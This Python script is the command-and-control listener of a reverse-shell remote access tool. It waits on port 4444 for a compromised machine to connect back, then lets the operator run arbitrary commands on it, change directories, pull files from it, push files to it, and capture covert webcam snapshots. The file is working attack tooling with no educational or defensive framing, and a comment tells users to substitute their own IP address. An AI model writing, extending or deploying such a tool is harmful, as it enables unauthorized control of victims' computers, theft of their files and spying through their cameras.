from multiprocessing import connection
import socket
import time

x = 0

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(("localhost", 4444)) # Replace localhost With Your IP Address.
listener.listen()
print("Server is started.!")
connection, address = listener.accept()
print("Got Connection From {}".format(address))

def send_data(output_data):
    size_of_data = len(output_data)
    size_of_data = str(size_of_data)
    connection.send(bytes(size_of_data, "utf-8"))
    time.sleep(2.0)
    connection.send(output_data)

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
    try:
        cmd = input("Enter a cmd : ")
        connection.send(bytes(cmd, "utf-8"))
        if cmd == "exit":
            connection.send(b"exit")
            connection.close()
            break
        elif cmd[:2] == "cd":
            recv = recv_data()
            print(recv.decode("utf-8"))
            continue
        elif cmd[:8] == "download":
            file_output = recv_data()
            if file_output == b"Hey, This File is Not Found in this Directory":
                print(file_output.decode("utf-8"))
                continue
            with open(f"{cmd[9::]}", "wb") as write_data:
                write_data.write(file_output)
                write_data.close()
            continue
        elif cmd[:6] == "upload":
            with open(f"{cmd[7::]}", "rb") as data:
                f_data = data.read()
                data.close()
            send_data(f_data)
            continue
        elif cmd[:11] == "webcam_snap":
            data = recv_data()
            if data == b"Camera Not Found..!!":
                print(data.decode("utf-8"))
                continue
            with open(f"{x}.jpg", "wb") as write_data:
                write_data.write(data)
                x = x + 1
                write_data.close()
            continue
        output = recv_data()
        print(output.decode("utf-8"))
    except FileNotFoundError:
        print("File Not Found :( ")
        send_data(b"error")
        continue
